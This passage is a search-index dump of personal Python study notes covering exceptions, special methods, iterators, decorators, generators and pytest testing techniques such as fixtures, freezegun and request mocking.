<li>ZeroDivisionError</li> </ul> </li> <li>AssertionError</li> <li>AttributeError</li> <li>BufferError</li> <li>EOFError</li> <li>ImportError<ul> <li>ModuleNotFoundError</li> </ul> </li> <li>LookupError<ul> <li>IndexError</li> <li>KeyError</li> </ul> </li> <li>MemoryError</li> <li>NameError<ul> <li>UnboundLocalError</li> </ul> </li> <li>OSError<ul> <li>BlockingIOError</li> <li>ChildProcessError</li> <li>ConnectionError<ul> <li>BrokenPipeError</li> <li>ConnectionAbortedError</li> <li>ConnectionRefusedError</li> <li>ConnectionResetError</li> </ul> </li> <li>FileExistsError</li> <li>FileNotFoundError</li> <li>InterruptedError</li> <li>IsADirectoryError</li> <li>NotADirectoryError</li> <li>PermissionError</li> <li>ProcessLookupError</li> <li>TimeoutError</li> </ul> </li> <li>ReferenceError</li> <li>RuntimeError<ul> <li>NotImplementedError</li> <li>RecursionError</li> </ul> </li> <li>SyntaxError<ul> <li>IndentationError<ul> <li>TabError</li> </ul> </li> </ul> </li> <li>SystemError</li> <li>TypeError</li> <li>ValueError<ul> <li>UnicodeError<ul> <li>UnicodeDecodeError</li> <li>UnicodeEncodeError</li> <li>UnicodeTranslateError</li> </ul> </li> </ul> </li> <li>Warning<ul> <li>DeprecationWarning</li> <li>PendingDeprecationWarning</li> <li>RuntimeWarning</li> <li>SyntaxWarning</li> <li>UserWarning</li> <li>FutureWarning</li> <li>ImportWarning</li> <li>UnicodeWarning</li> <li>BytesWarning</li> <li>EncodingWarning</li> <li>ResourceWarning <pre><code>## Class Definitions\n\n```python\nclass NetworkError(Exception):\n    pass\n\nclass DeviceError(Exception):\n    def __init__(self, errno, msg):\n        self.args = (errno, msg)\n        self.errno = errno\n        self.errmsg = msg\n</code></pre></li> </ul> </li> </ul> </li> </ul>"},{"location":"python/structure/structure/#context-manager","title":"Context Manager","text":"<pre><code>class ListTransaction:\n    def __init__(self, thelist):\n        self.thelist = thelist\n\n    def __enter__(self):\n        self.workingcopy = list(self.thelist)\n        return self.workingcopy\n\n    def __exit__(self, type, value, tb):\n        if type is None:\n            self.thelist[:] = self.workingcopy\n        return False\n</code></pre> <p>This class allows you to make a sequence of modifications to an existing list. However, the modifications only take effect if no exceptions occur. Otherwise, the original list is left unmodified.</p> <pre><code>items = [1, 2, 3]\nwith ListTransaction(items) as working:\n    working.append(4)\n    working.append(5)\n\nprint(items)  # Produces [1, 2, 3, 4, 5]\n\ntry:\n    with ListTransaction(items) as working:\n        working.append(6)\n        working.append(7)\n        raise RuntimeError(\"We're hosed!\")\n</code></pre>"},{"location":"python/structure/structure/#python-optimized-mode","title":"Python Optimized Mode","text":"<p>If you run Python with the <code>-o</code> option, it will run in optimized mode, but it won't check assertions.</p>"},{"location":"python/structure/structure/#what-is-object-in-python","title":"What is Object in Python","text":"<p>Every piece of data stored in a program is an object. Each object has an identity, a type (also known as its class), and a value. For example, when you write <code>a = 42</code>, an integer object is created with the value of 42. The identity of the object is a number representing its location in memory. <code>a</code> is a label that refers to this specific location, although the label is not part of the object itself. The type of an object, also known as the object's class, defines the object's internal data representation as well as supported methods. When an object of a particular type is created, that object is called an instance of that type. After an instance is created, its identity does not change. If an object's value can be modified, the object is said to be mutable. If the value cannot be modified, the object is said to be immutable. An object that holds references to other objects is said to be a container. Objects are characterized by their attributes. An attribute is a value associated with an object that is accessed using the dot operator (<code>.</code>). An attribute might be a simple data value, such as a number. However, an attribute could also be a function that is invoked to carry out some operation. Such functions are called methods.</p> <p>The following example illustrates access to attributes:</p> <pre><code>obj.attribute\n</code></pre> <p>A subtype is a type defined by inheritance. It carries all of the features of the original type plus additional and/or redefined methods. Inheritance is discussed in more detail in Chapter 7.</p> <p>Although type checks can be added to a program, this is often not as useful as you might imagine. For one, excessive checking impacts performance. Second, programs don't always define objects that neatly fit into a nice type hierarchy. For instance, if the purpose of the <code>isinstance(items, list)</code> statement above is to test whether <code>items</code> is \"list-like,\" it won't work with objects that have the same programming interface as a list but don't directly inherit from the built-in list type (one example is <code>deque</code> from the <code>collections</code> module).</p>"},{"location":"python/structure/structure/#reference-counting-and-garbage-collection","title":"Reference Counting and Garbage Collection","text":"<p>Python manages objects through automatic garbage collection. All objects are reference-counted. An object's reference count is increased whenever it's assigned to a new name or placed in a data structure that references it. An object's reference count is decreased by the <code>del</code> statement or whenever a reference goes out of scope or is reassigned.</p> <p>When an object's reference count reaches zero, it is garbage-collected. However, in some cases, a circular dependency may exist in a collection of objects that are no longer in use. In such cases, the destruction of the objects will be delayed until a cycle detector executes to find and delete the inaccessible objects. The exact behavior can be fine-tuned and controlled using functions in the <code>gc</code> standard library module. The <code>gc.collect()</code> function can be used to immediately invoke the cyclic garbage collector.</p>"},{"location":"python/structure/structure/#first-class-object","title":"First-Class Object","text":"<p>All objects in Python are said to be first-class. This means that all objects that can be assigned to a name can also be treated as data. As data, objects can be stored as variables, passed as arguments, returned from functions, compared against other objects, and more.</p>"},{"location":"python/structure/structure/#object-protocol-and-data-abstraction","title":"Object Protocol and Data Abstraction","text":"<p>Unlike a compiler for a static language, Python does not verify correct program behavior in advance. Instead, the behavior of an object is determined by a dynamic process that involves the dispatch of so-called \"special\" or \"magic\" methods. The names of these special methods are always preceded and followed by double underscores (<code>__</code>). The methods are automatically triggered by the interpreter as a program executes. For example, the operation <code>x * y</code> is carried out by a method <code>x.__mul(y)</code>. The names of these methods and their corresponding operators are hard-wired. The behavior of any given object depends entirely on the set of special methods that it implements.</p> <p>The next few sections describe the special methods associated with different categories of core interpreter features. These categories are sometimes called \"protocols.\" An object, including a user-defined class, may define any combination of these features to make the object behave in different ways. <pre><code>### Generate Markdown Table for Dunder\n\n| Method                      | Description                                 |\n|-----------------------------|---------------------------------------------|\n| `__init__(self, *args, **kwargs)` | Initializes an instance.             |\n| `__del__(self)`                    | Called when an instance is being destroyed.|\n| `__repr__(self)`                   | Creates a string representation.           |\n| `__new__(self)`                    | Creates a new instance.                    |\n\n### Object Management Methods\n\n| Method                 | Description                  |\n|------------------------|------------------------------|\n| `__add__(self, other)` | Adds two objects together.    |\n| `__sub__(self, other)` | Subtracts one object from another. |\n| `__mul__(self, other)` | Multiplies two objects.       |\n| `__truediv__(self, other)` | Divides one object by another. |\n| `__floordiv__(self, other)` | Performs floor division.    |\n| `__mod__(self, other)` | Performs modulo operation.    |\n| `__matmul__(self, other)` | Performs matrix multiplication. |\n\n\n\nIf `__bool__()` is undefined, then `__len__()` is used as a fallback. If both `__bool__()` and `__len__()` are undefined, an object is simply considered to be True.\n\nThe `__eq__()` method is used to determine basic equality for use with the `==` and `!=` operators. The default implementation of `__eq__()` compares objects by identity using the `is` operator. The `__ne__()` method, if present, can be used to implement special processing for `!=`, but is usually not required as long as `__eq__()` is implemented.\n\nMatrices, returning a matrix with the results. If comparison is not possible, the methods should return the built-in object `NotImplemented`. This is not the same as the `NotImplementedError`.\n\nIt is not necessary for an ordered object to implement all of the comparison operations in Table 4.3. If you want to be able to sort objects or use functions such as `min()` or `max()`, then `__lt__()` must be minimally defined. If you are adding comparison operators to a user-defined class, the `@total_ordering` class decorator in the `functools` module may be of some use. It can generate all of the methods as long as you minimally implement `__eq__()` and one of the other comparisons.\n\nThe `__hash__()` method is defined on instances that are to be placed into a set or be used as keys in a mapping (dictionary). The value returned is an integer that should be the same for two instances that compare as equal. Moreover, `__eq__()` should always be defined together with `__hash__()` because the two methods work together. The value returned by `__hash__()` is typically used as an internal implementation detail of various data structures. However, it\u2019s possible for two different objects to have the same hash value. Therefore, `__eq__()` is necessary to resolve potential collisions.\n\nConversion Protocols\n\n- `__str__(self)`: Conversion to a string\n- `__bytes__(self)`: Conversion to bytes\n- `__format__(self, format_spec)`: Creates a formatted representation\n- `__bool__(self)`: bool(self)\n- `__int__(self)`: int(self)\n- `__float__(self)`: float(self)\n- `__complex__(self)`: __index__(self) Conversion to an integer index [self]\n\nExamples of formatting:\n\n- `f'{x:spec}'`: Calls `x.__format__('spec')`\n- `format(x, 'spec')`: Calls `x.__format__('spec')`\n- `'x is {0:spec}'.format(x)`: Calls `x.__format__('spec')`\n\nThe `__index__()` method performs an integer conversion of an object when it\u2019s used in an operation that requires an integer value. This includes indexing in sequence operations. For example, if `items` is a list, performing an operation such as `items[x]` will attempt to execute `items[x.__index__()]` if `x` is...\n\nContainer Protocols\n\n- `__len__(self)`: Returns length\n- `__getitem__(self, key)`: Returns `self[key]`\n- `__setitem__(self, key, value)`: Sets `self[key] = value`\n- `__delitem__(self, key)`: Deletes `self[key]`\n- `__contains__(self, obj)`: `obj in self`\n\nHere\u2019s an example:\n\n```python\na = [1, 2, 3, 4, 5, 6]\nlen(a)               # a.__len__()\nx = a[2]             # x = a.__getitem__(2)\na[1] = 7             # a.__setitem__(1, 7)\ndel a[2]             # a.__delitem__(2)\n5 in a               # a.__contains__(5)\n</code></pre></p> <p>Slicing operations such as <code>x = s[i:j]</code> are also implemented using <code>__getitem__()</code>, <code>__setitem__()</code>, and <code>__delitem__()</code>. For slices, a special slice instance is passed as the key. This instance has attributes that describe the range of the slice being requested. For example:</p> <pre><code>a = [1, 2, 3, 4, 5, 6]\nx = a[1:5]           # x = a.__getitem__(slice(1, 5, None))\na[1:3] = [10, 11, 12]  # a.__setitem__(slice(1, 3, None), [10, 11, 12])\ndel a[1:4]           # a.__delitem__(slice(1, 4, None))\n</code></pre> <p>The slicing features of Python are more powerful than many programmers realize. For example, the following variations of extended slicing are all supported and may be useful for working with multidimensional data structures such as matrices and arrays:</p> <pre><code>a = m[0:100:10]          # Strided slice (step=10)\nb = m[1:10, 3:20]        # Multidimensional slice\nc = m[0:100:10, 50:75:5] # Multiple dimensions with strides\nm[0:5, 5:10] = n         # Extended slice assignment\ndel m[:10, 15:]          # Extended slice deletion\n</code></pre>"},{"location":"python/structure/structure/#iterator-protocol","title":"Iterator Protocol","text":"<p>If an instance, <code>obj</code>, supports iteration, it provides a method, <code>obj.iter()</code>, that returns an iterator. An iterator <code>iter</code>, in turn, implements a single method, <code>iter.next()</code>, that returns the next object or raises <code>StopIteration</code> to signal the end of iteration. These methods are used by the implementation of the <code>for</code> statement as well as other operations that implicitly perform iteration. For example, the statement <code>for x in s</code> is carried out by performing these steps:</p> <pre><code>_iter = s.__iter__()\nwhile True:\n    try:\n         x = _iter.__next__()\n    except StopIteration:\n         break\n    # Do statements in body of for loop\n</code></pre> <p>Sample Iterator</p> <pre><code>class FRange:\n    def __init__(self, start, stop, step):\n        self.start = start\n        self.stop = stop\n        self.step = step\n\n    def __iter__(self):\n        x = self.start\n        while x &lt; self.stop:\n            yield x\n            x += self.step\n\n# Example use:\nnums = FRange(0.0, 1.0, 0.1)\nfor x in nums:\n    print(x)     # 0.0, 0.1, 0.2, 0.3, ...\n</code></pre>"},{"location":"python/structure/structure/#attribute-access","title":"Attribute Access","text":"<ul> <li><code>__getattribute__(self, name)</code>: Returns the attribute <code>self.name</code></li> <li><code>__getattr__(self, name)</code>: Returns the attribute <code>self.name</code> if it\u2019s not found through <code>__getattribute__()</code></li> <li><code>__setattr__(self, name, value)</code>: Sets the attribute <code>self.name = value</code></li> <li><code>__delattr__(self, name)</code></li> </ul>"},{"location":"python/structure/structure/#function-protocol","title":"Function Protocol","text":"<p>An object can emulate a function by providing the <code>__call__()</code> method. If an object, <code>x</code>, provides this method, it can be invoked like a function. That is, <code>x(arg1, arg2, ...)</code> invokes <code>x.__call__(arg1, arg2, ...)</code>. There are many built-in types that support function calls. For example, types implement <code>__call__()</code> to create new instances. Bound methods implement <code>__call__()</code> to pass the <code>self</code> argument to instance methods. Library functions such as <code>functools.partial()</code> also create objects that emulate functions.</p>"},{"location":"python/structure/structure/#context-manager-protocol","title":"Context Manager Protocol","text":"<p>The <code>with</code> statement allows a sequence of statements to execute under the control of an instance known as a context manager. The general syntax is as follows:</p> <pre><code>with context [ as var]:\n     statements\n</code></pre> <p>A context object shown here is expected to implement the</p>"},{"location":"python/structure/structure/#use-repr","title":"Use <code>repr</code>","text":"<p>Just use <code>repr</code> it's good for debugging in the REPL.</p>"},{"location":"python/structure/structure/#docs","title":"Docs","text":"<p>Docstring is stored in the <code>__doc__</code> attribute. The documentation string is stored in the <code>doc</code> attribute of the function. It\u2019s often accessed by IDEs to provide interactive help. Functions can also be annotated with type hints. For example:</p>"},{"location":"python/structure/structure/#passing-arguments","title":"Passing Arguments","text":"<p>You can pass arguments like this:</p> <pre><code>def func(x, y, z):\n    ...\ns = (1, 2, 3)\n# Pass a sequence as arguments\nresult = func(*s)\n# Pass a mapping as keyword arguments\nd = { 'x':1, 'y':2, 'z':3 }\nresult = func(**d)\n</code></pre>"},{"location":"python/structure/structure/#tuple-example","title":"Tuple Example","text":"<pre><code>from typing import NamedTuple\n\nclass ParseResult(NamedTuple):\n    name: str\n    value: str\n\ndef parse_value(text):\n    '''\n    Split text of the form name=val into (name, val)\n    '''\n    parts = text.split('=', 1)\n    return ParseResult(parts[0].strip(), parts[1].strip())\n\nr = parse_value('url=http://www.python.org')\nprint(r.name, r.value)\n</code></pre>"},{"location":"python/structure/structure/#avoid-using-global-statement","title":"Avoid Using Global Statement","text":"<p>It should be noted that use of the global statement is usually considered poor Python style. If you\u2019re writing code where a function needs to mutate state behind the scenes, consider using a class definition and modify state by mutating an instance or class variable instead. For example:</p> <pre><code>class Config:\n    x = 42\n\ndef func():\n    Config.x = 13\n</code></pre> <p>Python allows nested function definitions. Here\u2019s an example:</p>"},{"location":"python/structure/structure/#inner-functions","title":"Inner Functions","text":"<p><code>nonlocal</code> cannot be used to refer to a global variable\u2014it must reference a local variable in an outer scope. Thus, if a function is assigning to a global, you should still use the global declaration.</p> <p>Use of nested functions and <code>nonlocal</code> declarations is not a common programming style. For example, inner functions have no outside visibility, which can complicate testing and debugging. Nevertheless, nested functions are sometimes useful for breaking recursion.</p> <ul> <li>Current limit: <code>sys.getrecursionlimit()</code> default is 1000</li> <li>Set limit: <code>sys.setrecursionlimit()</code></li> </ul>"},{"location":"python/structure/structure/#lambda-functions","title":"Lambda Functions","text":"<pre><code>x = 2\nf = lambda y: x * y\nx = 3\ng = lambda y: x * y\nprint(f(10))       # --&gt; prints 30\nprint(g(10))       # --&gt; prints 30\n</code></pre> <p>This is called late binding.</p> <pre><code>x = 2\nf = lambda y, x=x: x * y\nx = 3\ng = lambda y, x=x: x * y\n</code></pre>"},{"location":"python/structure/structure/#higher-order-functions","title":"Higher-Order Functions","text":"<p>Python supports the concept of higher-order functions. This means that functions can be passed as arguments to other functions, placed in data structures, and returned by a function as a result. Functions are said to be first-class objects, meaning there is no difference between how you might handle a function and any other kind of data.</p>"},{"location":"python/structure/structure/#function-as-callback-with-parameters","title":"Function as Callback with Parameters","text":"<pre><code>after(10, lambda: add(2, 3))\n\nfrom functools import partial\nafter(10, partial(add, 2, 3))\n</code></pre> <p>Since partials are fully evaluated, the callables created by <code>partial()</code> are objects that can be serialized into bytes, saved in files, and even transmitted across network connections (for example, using the <code>pickle</code> standard library module). This is not possible with a lambda function. Thus, in applications where functions are passed around, possibly to Python interpreters running in different processes or on different machines, you\u2019ll find <code>partial()</code> to be a bit more adaptable. As an aside, partial function application is closely related to a </p>"},{"location":"python/structure/structure/#decorators","title":"Decorators","text":"<p>Shorthand of Decorators</p> <pre><code>func = decorate(func)\n</code></pre> <pre><code>from functools import wraps\n\ndef trace(func):\n    @wraps(func)\n    def call(*args, **kwargs):\n        print('Calling', func.__name__)\n        return func(*args, **kwargs)\n    return call\n</code></pre> <p>The <code>@wraps()</code> decorator copies various function metadata to the replacement function. In this case, metadata from the given function <code>func()</code> is copied to the returned wrapper function <code>call()</code>.</p> <p>Multiple Decorators</p> <pre><code>@decorator1\n@decorator2\ndef func(x):\n    pass\n</code></pre> <p>The above code is equivalent to:</p> <pre><code>func = decorator1(decorator2(func))\n</code></pre>"},{"location":"python/structure/structure/#function-inspections","title":"Function Inspections","text":"<ul> <li><code>f.__name__</code>: Function name</li> <li><code>f.__qualname__</code>: Fully qualified name (if nested)</li> <li><code>f.__module__</code>: Name of module in which defined</li> <li><code>f.__doc__</code>: Documentation string</li> <li><code>f.__annotations__</code>: Type hints</li> <li><code>f.__globals__</code>: Dictionary that is the global namespace</li> <li><code>f.__closure__</code>: Closure variables (if any)</li> <li><code>f.__code__</code>: Underlying code object</li> </ul>"},{"location":"python/structure/structure/#check-if-two-function-parameters-are-the-same","title":"Check if Two Function Parameters are the Same","text":"<pre><code>import inspect\n\ndef func(x: int, y: float, debug=False) -&gt; float:\n    pass\n\nsig = inspect.signature(func)\n\nassert inspect.signature(func1) == inspect.signature(func2)\n</code></pre> <p>Attributes are not visible within the function body\u2014they are not local variables and do not appear as names in the execution environment. The main use of function attributes is to store extra metadata. Sometimes frameworks or various metaprogramming techniques utilize function tagging\u2014that is, attaching attributes to functions. One example is the <code>@abstractmethod</code> decorator that\u2019s used on methods within abstract base classes.</p> <pre><code>def func():\n    statements\n\nfunc.secure = 1\nfunc.private = 1\n</code></pre>"},{"location":"python/structure/structure/#frame-attributes","title":"Frame Attributes","text":"<ul> <li><code>f.f_back</code>: Previous stack frame (toward the caller)</li> <li><code>f.f_code</code>: Code object being executed</li> <li><code>f.f_locals</code>: Dictionary of local variables (<code>locals()</code>)</li> <li><code>f.f_globals</code>: Dictionary used for global variables (<code>globals()</code>)</li> <li><code>f.f_builtins</code>: Dictionary used for built-in names</li> <li><code>f.f_lineno</code>: Line number</li> <li><code>f.f_lasti</code>: Current instruction. This is an index into the bytecode string of <code>f_code</code>.</li> <li><code>f.f_trace</code>: Function called at the start of each source code line</li> </ul> <pre><code>import inspect\nfrom collections import ChainMap\n\ndef debug(*varnames):\n    f = inspect.currentframe().f_back  # Previous stack\n    vars = ChainMap(f.f_locals, f.f_globals)\n    print(f'{f.f_code.co_filename}:{f.f_lineno}')\n    for name in varnames:\n        print(f'    {name} = {vars[name]!r}')\n\n# Example use\ndef func(x, y):\n    z = x + y\n    debug('x', 'y')  # Shows x and y along with file/line\n</code></pre>"},{"location":"python/structure/structure/#dynamic-code-execution","title":"Dynamic Code Execution","text":"<pre><code>exec(str [, globals [, locals]])\n</code></pre> <pre><code>globs = {'x': 7,\n         'y': 10,\n         'birds': ['Parrot', 'Swallow', 'Albatross']\n         }\nlocs = {}\nexec('z = 3 * x + 4 * y', globs, locs)\nexec('for b in birds: print(b)', globs, locs)\n</code></pre> <pre><code>def make_init(*names):\n    parms = ','.join(names)\n    code = f'def __init__(self, {parms}):\\n'\n    for name in names:\n        code += f' self.{name} = {name}\\n'\n    d = {}\n    exec(code, d)\n    return d['__init__']\n\n# Example use\nclass Vector:\n    __init__ = make_init('x', 'y', 'z')\n</code></pre>"},{"location":"python/structure/structure/#positional-and-named-arguments","title":"Positional and Named Arguments","text":"<pre><code>def func(x, y, /):\n    pass\n\nfunc(1, 2)     # Ok\nfunc(1, y=2)   # Error\n</code></pre>"},{"location":"python/structure/structure/#name-and-docstring","title":"Name and Docstring","text":"<ul> <li><code>__name__</code></li> <li><code>__doc__</code></li> </ul>"},{"location":"python/structure/structure/#argument-passing","title":"Argument Passing","text":"<p>Everything is passed by reference, but extra care is needed only for mutable types. Pass ready parameters to functions.</p> <pre><code>def func(x, y, z):\n    ...\n\ns = (1, 2, 3)\n# Pass a sequence as arguments\nresult = func(*s)\n# Pass a mapping as keyword arguments\nd = {'x': 1, 'y': 2, 'z': 3}\nresult = func(**d)\n</code></pre>"},{"location":"python/structure/structure/#namedtuple","title":"NamedTuple","text":"<pre><code>from typing import NamedTuple\n\nclass ParseResult(NamedTuple):\n    name: str\n    value: str\n\ndef parse_value(text):\n    '''\n    Split text of the form name=val into (name, val)\n    '''\n    parts = text.split('=', 1)\n    return ParseResult(parts[0].strip(), parts[1].strip())\n</code></pre>"},{"location":"python/structure/structure/#late-binding","title":"Late Binding","text":"<pre><code>def func():\n    n += 1    # Error: UnboundLocalError\n</code></pre> <pre><code>x = 42\n\ndef func():\n    print(x)    # Fails. UnboundLocalError\n    x = 13\n</code></pre>"},{"location":"python/structure/structure/#async-function","title":"Async Function","text":"<p>Use of <code>await</code> is only valid within an enclosing async function definition. It\u2019s also a required part of making async functions execute. If you leave off the <code>await</code>, you\u2019ll find that the code breaks. The requirement of using <code>await</code> hints at a general usage issue with asynchronous functions. Namely, their different evaluation model prevents them from being used in combination with other parts of Python. Specifically, it is never possible to write code like <code>print(await twice(2))</code>\u2014at least not without an intervening <code>await</code> or <code>async</code> keyword.</p> <pre><code>async def twice(x):\n    return 2 * x\n\ndef main():\n    print(twice(2))         # Error. Doesn't execute the function\n    print(await twice(2))   # Error. Can't use await here.\n</code></pre>"},{"location":"python/structure/structure/#yield-and-return","title":"<code>yield</code> and <code>return</code>","text":"<pre><code>def func():\n    try:\n        next(f)\n    except StopIteration as e:\n        yield 37\n        return 42\n</code></pre> <pre><code>def countdown(n):\n    print('Counting down from', n)\n    try:\n        while n &gt; 0:\n            yield n\n            n = n - 1\n    finally:\n        print('Only made it to', n)\n</code></pre> <p>Generators are guaranteed to execute the <code>finally</code> block code even if the generator is not fully consumed\u2014it will execute when the abandoned generator is garbage-collected. Similarly, any cleanup code involving a context manager is also guaranteed to execute.</p>"},{"location":"python/structure/structure/#yield-from","title":"<code>yield from</code>","text":"<pre><code>def countup(stop):\n    n = 1\n    while n &lt;= stop:\n        yield n\n        n += 1\n\ndef countdown(start):\n    n = start\n    while n &gt; 0:\n        yield n\n        n -= 1\n\ndef up_and_down(n):\n    yield from countup(n)\n    yield from countdown(n)\n</code></pre> <p><code>yield from</code> is especially useful when writing code that must recursively iterate through nested iterables.</p> <pre><code>def flatten(items):\n    for i in items:\n        if isinstance(i, list):\n            yield from flatten(i)\n        else:\n            yield i\n</code></pre>"},{"location":"python/structure/structure/#avoiding-recursion-limit","title":"Avoiding Recursion Limit","text":"<pre><code>def flatten(items):\n    stack = [iter(items)]\n    while stack:\n        try:\n            item = next(stack[-1])\n            if isinstance(item, list):\n                stack.append(iter(item))\n            else:\n                yield item\n        except StopIteration:\n            stack.pop()\n</code></pre>"},{"location":"python/structure/structure/#sending-values-to-enhanced-generators-coroutines","title":"Sending Values to Enhanced Generators (Coroutines)","text":"<pre><code>def receiver():\n    print('Ready to receive')\n    while True:\n        n = yield\n        print('Got', n)\n</code></pre> <pre><code>r = receiver()\nr.send(None)        # Advances to the first yield\nprint(r.send(1))\nprint(r.send(2))\nprint(r.send('Hello'))\n</code></pre>"},{"location":"python/structure/structure/#check-throw-and-close-method-in-internet","title":"Check <code>throw()</code> and <code>close()</code> Method in Internet","text":""},{"location":"python/structure/structure/#enhanced-generators","title":"Enhanced Generators","text":"<p>Enhanced generators are an odd programming construct. Unlike a simple generator which naturally feeds a for loop, there is no core language feature that drives an enhanced generator. Why, then, would you ever want a function that needs values to be sent to it? Is it purely academic? Historically, enhanced generators have been used in the context of concurrency libraries\u2014especially those based on asynchronous I/O. In that context, they\u2019re usually referred to as coroutines or generator-based coroutines. However, much of that functionality has been folded into the <code>async</code> and <code>await</code> features of Python. There is little practical reason to use <code>yield</code> for that specific use case. That said, there are still some practical applications. Like generators, an enhanced generator can be used to implement different kinds of evaluation and control flow. One example is the <code>@contextmanager</code> decorator found in the <code>contextlib</code> module.</p> <pre><code>class Manager:\n    def __enter__(self):\n        return somevalue\n    def __exit__(self, ty, val, tb):\n        if ty:\n            # An exception occurred\n            ...\n            # Return True/ if handled. False otherwise\n</code></pre> <p>With the <code>@contextmanager</code> generator, everything prior to the <code>yield</code> statement executes when the manager enters (via the <code>enter()</code> method). Everything after the <code>yield</code> executes when the manager exits (via the <code>exit()</code> method). If an error took place, it is reported as an exception on the <code>yield</code> statement. Here's a book on the internet where you can find more information about this topic.</p>"},{"location":"python/structure/structure/#final-words-a-brief-history-of-generators-and-looking-forward","title":"Final Words: A Brief History of Generators and Looking Forward","text":"<p>Generators are one of Python\u2019s more interesting success stories. They are also part of a greater story concerning iteration. Iteration is one of the most common programming tasks of all. In early versions of Python, iteration was implemented via sequence indexing and the <code>__getitem__()</code> method. This later evolved into the current iteration protocol based on <code>__iter__()</code> and <code>__next__()</code> methods. Generators appeared shortly thereafter as a more convenient way to implement an iterator. In modern Python, there is almost no reason to ever implement an iterator using anything other than a generator. Even on iterable objects that you might define yourself, the <code>__iter__()</code> method itself is conveniently implemented in this way.</p> <p>In later versions of Python, generators took on a new role as they evolved enhanced features related to coroutines\u2014the <code>send()</code> and <code>throw()</code> methods. These were no longer limited to iteration but opened up possibilities for using generators in other contexts. Most notably, this formed the basis of many so-called async frameworks used for network programming and concurrency. However, as asynchronous programming has evolved, most of this has transformed into later features that use the <code>async</code>/<code>await</code> syntax. Thus, it\u2019s not so common to see generator functions used outside of the context of iteration\u2014their original purpose. In fact, if you find yourself defining a generator function and you\u2019re not sure why, it\u2019s worth questioning whether or not it\u2019s necessary.</p>"},{"location":"python/structure/structure/#function-introspection","title":"Function Introspection","text":"<p>Here are some useful function introspection attributes:</p> <ul> <li><code>f.__name__</code>: Function name</li> <li><code>f.__qualname__</code>: Fully qualified name</li> <li><code>f.__module__</code>: Module name</li> <li><code>f.__doc__</code>: Docstring</li> <li><code>f.__annotations__</code>: Type hints</li> <li><code>f.__globals__</code>: Dictionary of global namespace</li> <li><code>f.__closure__</code>: Closure variables</li> <li><code>f.__code__</code>: Code object</li> </ul>"},{"location":"python/talks/talks/","title":"Spy","text":"<p>speed increase</p>"},{"location":"python/talks/talks/#pyo3","title":"PyO3","text":""},{"location":"python/testing/test/","title":"Notes on Testing Hard-to-Test Aspects in Python Applications","text":"<p>Testing Python applications requires thoughtful strategies, especially for hard-to-test scenarios. Below are challenges, examples, and testing techniques like fixtures and exception handling, organized by common problem areas.</p>"},{"location":"python/testing/test/#1-concurrency-and-parallelism","title":"1. Concurrency and Parallelism","text":""},{"location":"python/testing/test/#challenges","title":"Challenges:","text":"<ul> <li>Thread safety (e.g., race conditions, deadlocks).</li> <li>Correctness in multiprocessing and async behavior.</li> </ul>"},{"location":"python/testing/test/#example-thread-safety-with-fixtures","title":"Example: Thread Safety with Fixtures","text":"<p>Using pytest fixtures to initialize shared resources for threading tests:</p> <pre><code>import pytest\nimport threading\n\n@pytest.fixture\ndef shared_counter():\n    return {\"value\": 0}\n\n@pytest.fixture\ndef lock():\n    return threading.Lock()\n\ndef test_thread_safety(shared_counter, lock):\n    def increment():\n        with lock:\n            shared_counter[\"value\"] += 1\n\n    threads = [threading.Thread(target=increment) for _ in range(5)]\n    for t in threads:\n        t.start()\n    for t in threads:\n        t.join()\n\n    assert shared_counter[\"value\"] == 5\n</code></pre>"},{"location":"python/testing/test/#2-time-dependent-behavior","title":"2. Time-Dependent Behavior","text":""},{"location":"python/testing/test/#challenges_1","title":"Challenges:","text":"<ul> <li>Dependencies on <code>datetime.now()</code>.</li> <li>Handling scheduled tasks.</li> </ul>"},{"location":"python/testing/test/#example-using-freezegun-library","title":"Example: Using <code>freezegun</code> Library","text":"<p>Freeze time to test time-dependent code deterministically:</p> <pre><code>from freezegun import freeze_time\nfrom datetime import datetime\n\n@freeze_time(\"2025-01-01 12:00:00\")\ndef test_time_dependent():\n    now = datetime.now()\n    assert now.year == 2025\n    assert now.hour == 12\n</code></pre>"},{"location":"python/testing/test/#3-randomness","title":"3. Randomness","text":""},{"location":"python/testing/test/#challenges_2","title":"Challenges:","text":"<ul> <li>Functions using randomization or stochastic behavior.</li> </ul>"},{"location":"python/testing/test/#example-mocking-randomness","title":"Example: Mocking Randomness","text":"<p>Patch random functions to produce predictable outputs:</p> <pre><code>import random\nfrom unittest.mock import patch\n\ndef random_number():\n    return random.randint(1, 100)\n\n@patch('random.randint', return_value=42)\ndef test_random_number(mock_random):\n    assert random_number() == 42\n</code></pre>"},{"location":"python/testing/test/#4-error-handling-and-edge-cases","title":"4. Error Handling and Edge Cases","text":""},{"location":"python/testing/test/#challenges_3","title":"Challenges:","text":"<ul> <li>Testing rare conditions.</li> <li>Ensuring proper exception handling.</li> </ul>"},{"location":"python/testing/test/#example-testing-exceptions-with-pytestraises","title":"Example: Testing Exceptions with <code>pytest.raises</code>","text":"<p>Assert that a function raises the expected exception:</p> <pre><code>import pytest\n\ndef divide(x, y):\n    if y == 0:\n        raise ValueError(\"Division by zero\")\n    return x / y\n\ndef test_divide_by_zero():\n    with pytest.raises(ValueError, match=\"Division by zero\"):\n        divide(1, 0)\n</code></pre>"},{"location":"python/testing/test/#5-third-party-libraries-and-apis","title":"5. Third-Party Libraries and APIs","text":""},{"location":"python/testing/test/#challenges_4","title":"Challenges:","text":"<ul> <li>Handling rate limits, downtime, or library changes.</li> </ul>"},{"location":"python/testing/test/#example-mocking-api-responses-with-requests-mock","title":"Example: Mocking API Responses with <code>requests-mock</code>","text":"<p>Simulate API responses without actual network calls:</p> <pre><code>import requests\nimport requests_mock\n\ndef get_data():\n    response = requests.get(\"https://api.example.com/data\")\n    return response.json()\n\ndef test_get_data():\n    with requests_mock.Mocker() as mock:\n        mock.get(\"https://api.example.com/data\", json={\"key\": \"value\"})\n        result = get_data()\n        assert result == {\"key\": \"value\"}\n</code></pre>"},{"location":"python/testing/test/#6-file-system-interactions","title":"6. File System Interactions","text":""},{"location":"python/testing/test/#challenges_5","title":"Challenges:","text":"<ul> <li>File locks, missing files, permissions.</li> </ul>"},{"location":"python/testing/test/#example-temporary-files-with-tmp_path-fixture","title":"Example: Temporary Files with <code>tmp_path</code> Fixture","text":"<p>Use temporary paths to test file I/O safely:</p> <pre><code>def write_to_file(file_path, content):\n    with open(file_path, \"w\") as file:\n        file.write(content)\n\ndef test_file_write(tmp_path):\n    temp_file = tmp_path / \"test.txt\"\n    write_to_file(temp_file, \"Hello, World!\")\n    assert temp_file.read_text() == \"Hello, 